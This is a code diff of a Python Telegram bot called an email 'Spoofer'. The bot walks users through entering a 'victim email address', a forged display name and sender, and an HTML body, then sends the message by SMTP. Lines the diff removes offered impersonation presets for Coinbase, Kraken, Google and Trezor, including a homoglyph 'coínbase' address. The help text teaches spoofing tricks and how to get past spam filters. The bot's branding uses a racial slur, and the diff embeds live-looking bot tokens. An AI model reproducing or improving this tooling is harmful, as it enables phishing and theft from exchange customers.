@@ -116,6 +116,8 @@ def increment_global_email_count(user_id):
 
 async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     donate_message = (
+        "If you want to support the team behind this, you can donate to the following addresses:\n\n"
+        
         "BTC: bc1qj8f5r29ksq3uq62eu6ycr9qt9sfz9hjkcvz00m\n"
         "ETH: 0x86FF30eF6fc3652345EEe0B01482a15FecE5DE00\n"
         "SOL: CmnkLiqxRh5cAMWLx3EewLn3Mpxw7KJbj7ox6hGPKX3p\n"
@@ -144,41 +146,24 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     )
 
     keyboard = [
-        [InlineKeyboardButton("Spoofer", callback_data="Spoofer")],
-        [InlineKeyboardButton("Donate", callback_data="/donate")],
-        [InlineKeyboardButton("Account", callback_data="/id")],
-        [InlineKeyboardButton("Help", callback_data="/help")]
+        [KeyboardButton("Spoofer")],
+        [KeyboardButton("Donate")],
+        [KeyboardButton("Account")],
+        [KeyboardButton("Help")]
     ]
 
 
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
     await update.message.reply_text(start_message, reply_markup=reply_markup)
 
 
-async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer()
-    data = query.data
-
-    if data == "Spoofer":
-        await start_custom_mail_flow(update, context)
-    elif data == "/donate":
-        await donate(update, context)
-    elif data == "/id":
-        await get_user_id(update, context)
-    elif data == "/help":
-        await help_command(update, context)
-
-async def start_custom_mail_flow(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Starts the custom email flow from a callback query."""
-    await update.callback_query.message.reply_text("Enter the victim email address:")
-    return CUSTOM_VICTIM_EMAIL
-
+async def back_to_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    await start(update, context)
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     help_text = (
-        "Welcome to *N Spoofer*\\! 🎭\n\n"
-        "Please check @nspoofer for frequently asked questions\\. For custom spoofings, follow this protocol:\n\n"
+        "Welcome to *Nigga Spoofer*\\! 🎭\n\n"
+        "Please check @niggaspoofer for frequently asked questions\\. For custom spoofings, follow this protocol:\n\n"
         "1\\. *Directory Spoofing*:\n"
         "   Let's say you want to spoof `playboicarti\\.com`\\. For your email, you'll want it to end in one of the directories\\.\n"
         "   Example: Instead of `@playboicarti\\.com`, use `@playboicarti\\.com/tour`\\.\n\n"
@@ -211,69 +196,24 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     context.user_data.clear()
     return ConversationHandler.END
 
-
-async def get_recipients(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get recipient emails and move to spoof email selection."""
-    context.user_data["recipients"] = update.message.text
-
-    if context.user_data.get("conversation") == "employee_kraken":
-        keyboard = [
-            [InlineKeyboardButton("help@kraken", callback_data="help@kraken")],
-            [InlineKeyboardButton("no-reply@kraken.com/help", callback_data="no-reply@kraken.com/help")]
-        ]
-    elif context.user_data.get("conversation") == "employee_coinbase":
-        keyboard = [
-            [InlineKeyboardButton("help@coinbase", callback_data="help@coinbase")],
-            [InlineKeyboardButton("no-reply@coinbase.com/help", callback_data="no-reply@coinbase.com/help")],
-            [InlineKeyboardButton("help@coínbase.com", callback_data="help@coínbase.com")]
-        ]
-    elif context.user_data.get("conversation") == "coinbase_delay":
-        keyboard = [
-            [InlineKeyboardButton("help@coinbase", callback_data="help@coinbase")],
-            [InlineKeyboardButton("no-reply@coinbase.com/help", callback_data="no-reply@coinbase.com/help")],
-            [InlineKeyboardButton("help@coínbase.com", callback_data="help@coínbase.com")]
-        ]
-    elif context.user_data.get("conversation") == "employee_google":
-        keyboard = [
-            [InlineKeyboardButton("help@google", callback_data="help@google")],
-            [InlineKeyboardButton("david@google.com/support", callback_data="david@google.com/support")]
-        ]
-    elif context.user_data.get("conversation") == "employee_trezor":
-        keyboard = [
-            [InlineKeyboardButton("help@trezor", callback_data="help@trezor")],
-            [InlineKeyboardButton("no-reply@trezor.io/help", callback_data="no-reply@trezor.io/help")]
-        ]
-    else:
-        keyboard = [
-            [InlineKeyboardButton("help@coinbase", callback_data="help@coinbase")],
-            [InlineKeyboardButton("no-reply@coinbase.com/help", callback_data="no-reply@coinbase.com/help")],
-            [InlineKeyboardButton("help@coínbase.com", callback_data="help@coínbase.com")]
-        ]
-
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text("Spoof as:", reply_markup=reply_markup)
-    return SPOOF_EMAIL
-
 async def custom_mail(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Initiates the custom email flow."""
     if update.message:
-        await update.message.reply_text("Enter the victim email address:")
-        return CUSTOM_VICTIM_EMAIL
-    else:
-        # Handle the case where update.message is None
-        await update.effective_chat.send_message("This command can only be used in a message context.")
-        return ConversationHandler.END
+        await update.message.reply_text("Start by entering the email address of the target! (eg. niggaspoofer@juggalot.com) Cancel this flow using /cancel:")
+    elif update.callback_query:
+        await update.callback_query.message.reply_text("Start by entering the email address of the target! (eg. niggaspoofer@juggalot.com) Cancel this flow using /cancel:")
+    return CUSTOM_VICTIM_EMAIL
 
 async def get_custom_victim_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Stores the victim email and asks for the email subject."""
     context.user_data["victim_email"] = update.message.text
-    await update.message.reply_text("Enter the subject of the email:")
+    await update.message.reply_text("Enter the subject (header) of the email: (Avoid spam words!)")
     return CUSTOM_SUBJECT
 
 async def get_custom_subject(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Stores the subject and asks for the sender name."""
     context.user_data["subject"] = update.message.text
-    await update.message.reply_text("Enter the display name:")
+    await update.message.reply_text("Enter the display name: (The name that will show up as the sender, for david@coinbase.com you could use David")
     return CUSTOM_SENDER_NAME
 
 async def get_custom_sender_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -285,7 +225,7 @@ async def get_custom_sender_name(update: Update, context: ContextTypes.DEFAULT_T
 async def get_custom_display_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Stores the display email and asks for the HTML file to send."""
     context.user_data["display_email"] = update.message.text
-    await update.message.reply_text("Upload the HTML file:")
+    await update.message.reply_text("Upload the HTML file: (you can currently only fetch images from hyperlinks (eg. src = https://wikimedia.com/yourimage) If your messages arent delivering make sure your .HTML isnt spammy.")
     return CUSTOM_HTML
 
 async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -293,13 +233,17 @@ async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     if update.message.document:
         file = await update.message.document.get_file()
         html_content = await file.download_as_bytearray()
+
+
         context.user_data["html_content"] = html_content.decode("utf-8")
+
 
         victim_email = context.user_data["victim_email"]
         subject = context.user_data["subject"]
         sender_name = context.user_data["sender_name"]
         display_email = context.user_data["display_email"]
         html_body = context.user_data["html_content"]
+
 
         msg = MIMEMultipart("related")
         msg["Subject"] = subject
@@ -319,6 +263,7 @@ async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             await update.message.reply_text("Custom email sent successfully!")
         except Exception as e:
             await update.message.reply_text(f"Failed to send email: {str(e)}")
+
 
         context.user_data.clear()
         return ConversationHandler.END
@@ -395,8 +340,9 @@ def send_email_through_smtp(display_name, smtp_username, subject, msg, recipient
         logging.error(f"Failed to send email: {str(e)}")
         raise e
 
+
 custom_mail_handler = ConversationHandler(
-    entry_points=[CallbackQueryHandler(handle_callback_query, pattern="^Spoofer$")],
+    entry_points=[CommandHandler("Spoofer", custom_mail)],
     states={
         CUSTOM_VICTIM_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_victim_email)],
         CUSTOM_SUBJECT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_subject)],
@@ -405,27 +351,35 @@ custom_mail_handler = ConversationHandler(
         CUSTOM_HTML: [MessageHandler(filters.Document.ALL & ~filters.COMMAND, get_custom_html)],
     },
     fallbacks=[CommandHandler("cancel", cancel)],
-
 )
 
+async def account_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = update.effective_user.id
+    account_message = (
+        f"Account Information:\n\n"
+        f"User ID: {user_id}\n"
+        f"Mails sent: {user_email_counts.get(str(user_id), 0)}"
+    )
+    await update.message.reply_text(account_message)
 def main():
     load_email_counts()
 
 
-    TOKEN = "8157065921:AAGzZPW0q-2aSs4Pcg_E0qBGV2v3RkHVjEA"
+    TOKEN = "7913920205:AAEEHW_QOaFQcH1zjwUXSru84iWNRTRSWsU"
     application = ApplicationBuilder().token(TOKEN).build()
 
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_command))
+    application.add_handler(CommandHandler("donate", donate))
     application.add_handler(CommandHandler("id", get_user_id))
-
-
-
     application.add_handler(custom_mail_handler)
-
+    application.add_handler(MessageHandler(filters.TEXT & filters.Regex("^(Donate)$"), donate))
+    application.add_handler(MessageHandler(filters.TEXT & filters.Regex("^(Account)$"), account_info))
     application.add_handler(broadcast_handler)
+    application.add_handler(MessageHandler(filters.TEXT & filters.Regex("^(Spoofer)$"), custom_mail))
+    application.add_handler(MessageHandler(filters.TEXT & filters.Regex("^(Help)$"), help_command))
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CallbackQueryHandler(handle_callback_query))
+    application.add_handler(CommandHandler("cancel", cancel))
 
     application.run_polling()
 
